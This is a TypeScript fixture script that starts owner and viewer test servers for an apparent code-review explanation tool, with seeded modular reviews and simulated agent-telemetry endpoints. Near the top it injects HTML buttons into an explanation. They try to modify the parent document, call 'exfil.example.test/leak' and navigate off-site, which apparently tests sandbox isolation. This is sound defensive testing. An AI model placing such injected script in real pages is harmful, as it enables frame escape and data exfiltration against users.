import { writeFileSync } from "node:fs";
import path from "node:path";
import { fixture, seed } from "./fixtures.js";
import { createServer } from "../src/server.js";
import type { Run } from "../src/types.js";
import type { ServerResponse } from "node:http";
const f = fixture();
writeFileSync(
  path.join(f.root, "owner-token"),
  "synthetic-test-owner-key-not-a-real-credential",
  { mode: 0o600 },
);
const { review, explanation } = await seed(f.service);
explanation.html += `<button id="test-sandbox" onclick="try{parent.document.body.dataset.compromised='yes';document.getElementById('isolation').textContent='broken'}catch(e){document.getElementById('isolation').textContent='opaque origin'}fetch('https://exfil.example.test/leak').catch(()=>{})">Check isolation</button><p id="isolation"></p><button id="test-navigation" onclick="location.href='https://exfil.example.test/navigation'">Attempt external navigation</button>`;
f.service.store.put("explanation", explanation);
// A separate modular review preserves the legacy fixture and its acceptance cases.
const previousSnapshot = f.service.current;
const moduleTarget = {
  ...previousSnapshot.target,
  repo: "sample/modules",
  number: 43,
  url: "https://code.example.test/sample/modules/merge_requests/43",
};
const moduleVersion = {
  ...structuredClone(previousSnapshot),
  id: "module-version",
  target: moduleTarget,
  title: "Review by module",
  files: [
    ...previousSnapshot.files,
    {
      ...previousSnapshot.files[0],
      path: "shared/contract.ts",
      oldPath: "shared/contract.ts",
    },
  ],
};
f.service.current = moduleVersion;
const moduleReview = await f.service.import(moduleTarget.url);
const moduleReference = await f.service.createReference(
  moduleReview.id,
  moduleVersion.id,
  "src/queue.ts",
  "new",
  2,
  2,
);
const moduleGroups = structuredClone(explanation.guide!.groups);
moduleGroups[0].responsibility = "处理任务取消与资源释放";
moduleGroups[0].reviewFocus = ["核对取消后是否释放资源"];
moduleGroups[0].context = [
  {
    group: 2,
    reason: "资源释放依赖共享接口的新回调约定",
    referenceIds: [moduleReference.id],
  },
];
moduleGroups[1].responsibility = "规定共享接口的回调约定";
moduleGroups[1].reviewFocus = ["核对调用方是否遵守新约定"];
moduleGroups[1].context = [];
moduleGroups[1].title = "共享接口";
moduleGroups[1].points[0].title = "共享接口约定";
moduleGroups[1].points[0].files = ["shared/contract.ts"];
for (const g of moduleGroups)
  for (const p of g.points) p.referenceIds = [moduleReference.id];
f.service.store.put("explanation", {
  ...explanation,
  id: "module-explanation",
  reviewId: moduleReview.id,
  versionId: moduleVersion.id,
  html: "<h1>Module overview</h1>",
  references: [moduleReference],
  guide: { groups: moduleGroups },
  ownership: {
    versionId: moduleVersion.id,
    provider: "codebase",
    status: "complete",
    capturedAt: "2026-01-01T00:00:00Z",
    rules: [],
    warnings: [],
    files: [
      {
        path: "src/queue.ts",
        side: "new",
        owners: ["runtime"],
        ruleIds: [],
        status: "resolved",
      },
      {
        path: "shared/contract.ts",
        side: "new",
        owners: ["contracts"],
        ruleIds: [],
        status: "resolved",
      },
    ],
  },
});
moduleReview.explanationId = "module-explanation";
f.service.store.put("review", moduleReview);
f.service.current = previousSnapshot;
f.service.store.put("run", {
  id: "private-question",
  reviewId: review.id,
  versionId: explanation.versionId,
  kind: "question",
  state: "succeeded",
  backend: "traex",
  question: "PRIVATE-QUESTION-SENTINEL",
  answer: "PRIVATE-ANSWER-SENTINEL",
  createdAt: explanation.createdAt,
});
const owner = await createServer(f.service, true),
  viewer = await createServer(f.service, false);
const streams = new Set<ServerResponse>();
owner.addHook("onRequest", async (req, res) => {
  if (req.url.includes("/runs/synthetic-telemetry-run/events")) {
    streams.add(res.raw);
    res.raw.once("close", () => streams.delete(res.raw));
  }
});
// Synthetic UI controls exist only in this test server, never in production.
owner.post("/__fixture/telemetry", async (req) => {
  const { action } = req.body as { action: string };
  const id = "synthetic-telemetry-run";
  if (action === "start") {
    const run: Run = {
      id,
      reviewId: review.id,
      versionId: review.versionId,
      explanationId: explanation.id,
      kind: "analysis",
      state: "running",
      backend: "codex",
      model: "synthetic-model",
      effort: "high",
      createdAt: new Date(Date.now() - 65000).toISOString(),
    };
    f.service.store.put("run", run);
    f.service.record(id, {
      type: "status",
      stage: "investigating",
      source: "agent",
      message: "已核对取消操作，现在检查资源释放路径。",
      filesRead: 3,
      toolCalls: 5,
    });
    f.service.record(id, {
      type: "usage",
      usage: {
        inputTokens: 12000,
        cachedInputTokens: 9000,
        outputTokens: 600,
        reasoningOutputTokens: 200,
        totalTokens: 12600,
      },
    });
  } else if (action === "disconnect") {
    for (const stream of streams) stream.destroy();
  } else if (action === "progress") {
    f.service.record(id, {
      type: "status",
      stage: "generating",
      message: "正在生成交互讲解",
      outputChars: 8234,
      savedParts: 3,
      savedChars: 8234,
      filesRead: 7,
      toolCalls: 11,
    });
    f.service.record(id, {
      type: "usage",
      usage: {
        inputTokens: 18000,
        cachedInputTokens: 14000,
        outputTokens: 1600,
        reasoningOutputTokens: 400,
        totalTokens: 19600,
      },
    });
  } else if (action === "finish") {
    const run = f.service.store.get<Run>("run", id);
    run.state = "succeeded";
    run.finishedAt = new Date().toISOString();
    f.service.store.put("run", run);
    f.service.record(id, { type: "finished", state: "succeeded" });
  } else if (action === "cleanup") {
    f.service.store.db
      .prepare("DELETE FROM items WHERE kind='run' AND id=?")
      .run(id);
  }
  return { id };
});
await owner.listen({ host: "127.0.0.1", port: 19371 });
await viewer.listen({ host: "127.0.0.1", port: 19370 });
const stop = async () => {
  await Promise.all([owner.close(), viewer.close()]);
  f.cleanup();
  process.exit(0);
};
process.on("SIGTERM", stop);
process.on("SIGINT", stop);
